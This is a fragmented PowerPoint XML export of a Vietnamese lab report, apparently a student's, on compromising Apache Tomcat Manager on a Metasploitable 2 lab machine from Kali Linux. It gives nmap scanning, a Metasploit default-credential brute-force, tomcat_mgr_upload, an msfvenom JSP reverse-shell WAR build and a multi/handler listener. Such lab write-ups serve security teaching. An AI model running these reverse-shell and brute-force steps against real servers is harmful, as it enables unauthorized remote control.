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2" r:id="rId3"/>
    <p:sldId id="268" r:id="rId4"/>
    <p:sldId id="269" r:id="rId5"/>
    <p:sldId id="267" r:id="rId6"/>
    <p:sldId id="266" r:id="rId7"/>
    <p:sldId id="265" r:id="rId8"/>
    <p:sldId id="264" r:id="rId9"/>
    <p:sldId id="263" r:id="rId10"/>
    <p:sldId id="261" r:id="rId11"/>
    <p:sldId id="260" r:id="rId12"/>
    <p:sldId id="259" r:id="rId13"/>
    <p:sldId id="258" r:id="rId14"/>
    <p:sldId id="257" r:id="rId15"/>
    <p:sldId id="273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86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0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5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8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9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0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2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70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93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98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462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68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9023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3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77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7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D8B6D55-BA40-4E8F-AD4A-EE72D3B3D14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D8D6979-241D-4D1E-BCFA-65C18D916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445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F1DFF-891F-4C74-AAA1-4DDDE4564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741" y="687629"/>
            <a:ext cx="10756761" cy="1433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Báo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hành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tấn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công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Apache tomcat/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>jboss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kali </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>linux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metasploiable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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Nguyễn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Thành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Lâm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95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F1DFF-891F-4C74-AAA1-4DDDE4564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59105"/>
            <a:ext cx="8001000" cy="7406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Giới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thiệu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lỗ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hổng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8" y="1002182"/>
            <a:ext cx="11631168" cy="556686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1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379" y="351130"/>
            <a:ext cx="11280039" cy="612282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Setup:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Máy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tấn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công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r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>	kali </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>linux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ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: 192.168.1.40</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>	network: bridge adapter</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> victim: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metasploiable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 2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ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: 192.168.1.20</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>	network: bridge adapter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0D85A-8156-488A-B762-3716E9DF4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631" y="172292"/>
            <a:ext cx="5712341" cy="2548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3E2DE3-7712-41A3-ADE5-1D6DA0B21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809" y="3011300"/>
            <a:ext cx="6249609" cy="247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9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97510"/>
            <a:ext cx="11005478" cy="6349593"/>
          </a:xfrm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Mục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tiêu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Chiếm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quyền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điều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khiển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máy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chủ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lên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Web Shell qua </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>giao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diện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trị</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Tomcat Manager.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ping </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>thăm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dò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	ping 192.168.1.20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Quét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Cổng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bản</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (Nmap): 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Nmap </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>để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cổng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 8180 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>	(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cổng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mặc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định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của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Tomcat) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>đang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mở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kiểm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bản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nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> –p 8180 192.168.1.20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7C2F6-DE30-4475-BD08-F209AF41B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587" y="639977"/>
            <a:ext cx="5357830" cy="3210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6DC4E2-B1AB-4895-ADB0-F2DE37866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637" y="4179388"/>
            <a:ext cx="5798335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0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965" y="299923"/>
            <a:ext cx="11499495" cy="5969203"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Truy cập Trình duyệt: Mở trình duyệt trên Kali và truy cập: http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>192.168.1.20</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>:8</a:t>
            </a:r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vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>80/ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ta</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> sẽ thấy trang chào mừng của Apache Tomcat. Nhấn vào liên kết "Manager App" để chuyển đến giao diện đăng nhập (thường là /manager/html).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A8470-7540-4B07-B66B-3C6028EF1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65" y="1602029"/>
            <a:ext cx="4997072" cy="2494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52A2E5-40A0-4820-A13A-8A027F58C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712" y="1975104"/>
            <a:ext cx="5730919" cy="424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7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555" y="248719"/>
            <a:ext cx="11419026" cy="6342276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Tấn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công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Brute-force/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Mật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khẩu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Mặc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định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Trang </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>quản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trị</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Tomcat </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>yêu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cầu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Basic Authentication. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nổi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tiếng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việc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mật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khẩu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mặc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định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yếu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err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Khởi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động</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Metasploit: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msfconsole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Module </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Quét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 err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Trong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msfconsole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một</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> module </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>quét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mật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khẩu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tìm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tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>đăng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lệ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	use auxiliary/scanner/http/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tomcat_mgr_login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E6188-19FC-45DA-982C-C764599E1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96" y="1179423"/>
            <a:ext cx="3519421" cy="2309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0221E5-9CC2-4425-9C64-03A77CC2F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538" y="5244201"/>
            <a:ext cx="4277322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92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499" y="329184"/>
            <a:ext cx="11455603" cy="6144767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Thiết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Tùy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chọn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Quét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	set RHOSTS 192.168.1.20</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>	set RPORT 8080</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>	set TARGETURI /manager/html</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chạy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quét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vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kết quả dự kiến: Module sẽ nhanh chóng tìm thấy cặp thông tin đăng nhập mặc định (thường là tomcat:tomcat hoặc một cặp yếu khác) và hiển thị thông báo "Successful login". Ghi lại cặp này.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run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AC55D-D40F-4BDF-B7C9-5376063CB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105" y="148243"/>
            <a:ext cx="6030167" cy="1133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14CA70-B7C0-4334-BD87-3B181B2EE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99" y="3869741"/>
            <a:ext cx="2071397" cy="2542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30D896-1507-48BF-A7B6-3DAEF5B40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002" y="3869741"/>
            <a:ext cx="1888400" cy="24788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4BE0E7-323C-48A3-A562-2C3BDF7886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508" y="3067478"/>
            <a:ext cx="1406276" cy="17788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187085-8A1B-4C67-8433-53CA8BD624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163" y="5217448"/>
            <a:ext cx="3079770" cy="1256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2EE926-C36F-49B9-9C12-5146E616F1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508" y="3107989"/>
            <a:ext cx="2447037" cy="325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1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923" y="285293"/>
            <a:ext cx="11499495" cy="6137453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cặp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> ta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>quét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ở </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>đây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là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tomcat:tomcat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Khai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lên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Web Shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sau </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>khi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tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>đăng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lệ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chúng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> ta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sử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module </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>khai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lên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> payload (Web Shell).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chọn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Module </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Khai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thác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	use exploit/multi/http/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tomcat_mgr_upload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vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kiểm tra các tham số cần thiếtTrước tiên,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vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>hãy xem module yêu cầu những gì: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show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4AAFA-78B7-4405-AA08-885DC614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448" y="288950"/>
            <a:ext cx="4744112" cy="295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D5DC6-1CB8-439D-89AE-79BB69C02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755" y="2237829"/>
            <a:ext cx="5591955" cy="71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051C8E-1491-45FB-A837-388F31DE5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723" y="3046681"/>
            <a:ext cx="4744113" cy="35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1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141" y="241403"/>
            <a:ext cx="11623853" cy="6298386"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Thiết lập mục tiêu (Metasploitable 2)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	set RHOSTS 192.168.1.20</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>	set RPORT 8180</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Thiết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tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>đăng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Mặc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định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Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 2, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tài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khoản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trị</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Tomcat </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>là</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> tomcat / tomcat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	set </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HttpUsername</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> tomcat </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>	set </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HttpPassword</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> tomcat</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Thiết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máy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tấn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công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (Kali Linux):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da-DK" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>set LHOST 192.168.1.40</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="da-DK" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>	set LPORT 4446</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chọn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Payload (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Vỏ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bọc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thi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	set PAYLOAD java/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>jsp_shell_reverse_tcp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15AB5-60BB-4899-B6BA-B2ED3245A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399" y="2315190"/>
            <a:ext cx="4769565" cy="222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27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59" y="190195"/>
            <a:ext cx="11565331" cy="6386170"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p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Metasploit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:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Exploit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>xong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terminal victim</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	run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tk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mk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dò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tomcat:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: tomcat</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: tomcat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0A4D7-5266-4F5C-AC3F-87BF7D0D5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417" y="659626"/>
            <a:ext cx="3875653" cy="2266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C169A6-8A06-48A2-943A-A516D5670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286" y="3758690"/>
            <a:ext cx="4326165" cy="26311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5C391F-F741-405C-A01A-63FB944289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178" y="3758689"/>
            <a:ext cx="4338181" cy="263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3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8" y="241403"/>
            <a:ext cx="11558016" cy="6349592"/>
          </a:xfrm>
        </p:spPr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exploit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tomcat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Lỗi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>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do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Metasploit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update </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bản</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Metasploit: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vẻ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qua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file shell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tomcat.</a:t>
            </a:r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ECA58-FE35-41E8-86B9-850E08AF4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689" y="727235"/>
            <a:ext cx="4141650" cy="2381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68CD4-D447-475F-9D6C-7BDA4F56B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005" y="4356406"/>
            <a:ext cx="4980903" cy="226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1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923" y="234086"/>
            <a:ext cx="11594592" cy="6334963"/>
          </a:xfrm>
        </p:spPr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shell: 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  <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> –p java/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>jsp_shell_reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> LHOST= 192.168.1.40 LPORT=4446 –f war &gt; 	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>my_shell.war</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p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ở </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phần</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> deploy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tomcat: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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thấy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> file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application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tomcat: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77D01-8EFF-40D9-81A6-CB66EE204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703" y="165252"/>
            <a:ext cx="7802064" cy="924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98B5BC-2AB9-4FB0-A918-76BDE2538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906" y="3186429"/>
            <a:ext cx="4143953" cy="924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276801-7E7E-4DA9-8211-30D268455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074" y="1617639"/>
            <a:ext cx="4987034" cy="1438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BC1B78-0F21-4B13-B183-9287994500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10" y="2576880"/>
            <a:ext cx="4010585" cy="724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42F068-BCCE-4B7D-B331-AFDB8174F9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685" y="4713206"/>
            <a:ext cx="7432906" cy="195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10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499" y="197510"/>
            <a:ext cx="11579962" cy="6386169"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/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Metasploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>msfconsole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setup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</a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Shell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.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	use exploit/multi/handler</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	set PAYLOAD java/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>jsp_shell_reverse.tcp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	set LHOST 192.168.1.40</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	set LPORT 4446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ADE01-C0D2-4980-ABD6-77F3030B3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943" y="116029"/>
            <a:ext cx="2926558" cy="2691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C42E74-7856-4673-8E31-6C54D3B3D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640" y="3786625"/>
            <a:ext cx="5706271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97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141" y="285293"/>
            <a:ext cx="11748211" cy="6225235"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p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my_shell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tomcat ta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thử</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
